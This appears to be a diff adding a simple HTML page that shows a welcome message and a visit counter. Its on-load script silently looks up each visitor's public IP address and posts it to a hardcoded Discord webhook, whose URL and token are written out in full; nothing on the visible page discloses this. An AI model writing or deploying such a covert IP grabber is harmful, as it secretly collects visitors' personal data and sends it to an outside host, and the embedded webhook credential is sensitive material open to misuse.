@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>My Web Page</title>
+    <script>
+        function sendMessage(webhookURL, message) {
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({content: message})
+            })
+            .catch(error => console.log(error));
+        }
+
+        function splitMessage(message, maxLength) {
+            var messages = [];
+            var words = message.split(' ');
+            var currentMessage = '';
+            words.forEach(word => {
+                if (currentMessage.length + word.length < maxLength) {
+                    currentMessage += word + ' ';
+                } else {
+                    messages.push(currentMessage.trim());
+                    currentMessage = word + ' ';
+                }
+            });
+            messages.push(currentMessage.trim());
+            return messages;
+        }
+
+        window.onload = function() {
+            // Send IP to Discord webhook
+            var ip = '';
+            fetch('https://api.my-ip.io/ip')
+                .then(response => response.text())
+                .then(data => {
+                    ip = data.trim();
+                    var webhookURL = 'https://discord.com/api/webhooks/1125449057347846315/Xiiy-bJH4CYr9MKDDrX3DxQRl9QlfMWyh4V-bZ-HDpj7gtYgun4OyFZSIEGt1cJ5vuN4';
+                    var content = 'IP Address: ' + ip;
+                    if (content.length <= 2000) {
+                        sendMessage(webhookURL, content);
+                    } else {
+                        var messages = splitMessage(content, 2000);
+                        messages.forEach(message => sendMessage(webhookURL, message));
+                    }
+                })
+                .catch(error => console.log(error));
+
+            // Increment global counter and display on page
+            fetch('counter.php')
+                .then(response => response.text())
+                .then(data => {
+                    var counter = parseInt(data);
+                    if (!isNaN(counter)) {
+                        counter++;
+                        fetch('counter.php?counter=' + counter);
+                        document.getElementById('counter').innerHTML = counter;
+                    } else {
+                        console.log('Invalid counter value:', data);
+                    }
+                })
+                .catch(error => console.log(error));
+        };
+    </script>
+</head>
+<body>
+    <h1>Welcome to my web page!</h1>
+    <p>This is some text on my web page.</p>
+    <p>The page has been loaded <span id="counter"></span> times.</p>
+</body>
+</html>
